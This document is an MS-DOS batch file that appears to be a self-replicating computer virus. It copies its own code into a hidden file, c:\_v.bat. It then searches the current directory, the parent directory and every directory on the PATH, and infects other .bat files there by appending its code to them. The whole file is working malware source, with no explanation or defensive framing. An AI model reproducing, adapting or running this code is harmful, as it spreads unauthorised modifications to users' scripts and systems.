@echo off%_v%
if '%1=='v goto v%2
set v=%0.bat
if not exist %v% set v=%0
if '%v%==' set v=autoexec.bat
set !v=%1 %2 %3 %4 %5 %6 %7 %8 %9
if exist c:\_v.bat goto vg
if exist %v% goto vfe
call %v% v h %path%
if exist %v% goto vfe
goto ev
:vh
shift%_v%
if '%2==' goto vend
if exist %2\%v% set v=%2\%v%
if exist %2%v% set v=%2%v%
if exist %2\%v%.bat set v=%2\%v%.bat
if exist %2%v%.bat set v=%2%v%.bat
if not exist %v% goto vh
goto vend
:vfe
find "v"<%v%>c:\_v.bat
attrib c:\_v.bat +h
:vg
command /e:5000 /c c:\_v v vir . .. %path%
:ev
call %v% v rh
set _v=>nul.v
set !v=
set v=
goto vend
:vrh
set _v=x%_v%
%v% %!v%
:vvir
shift%_v%
if '%2==' exit v
for %%a in (%2\*.bat %2*.bat) do call c:\_v v i %%a
goto vvir
:vi
find "v"<%3>nul
if not errorlevel 1 goto vj
echo @if '%%_v%%==' goto _v>v$
type %3>>v$
echo.>>v$
type c:\_v.bat>>v$
move v$ %3>nul
set v#=%v#%1
if %v#%==11111111 exit
:vj
set v!=%v!%1
if %v!%==1111111111111 exit
:vend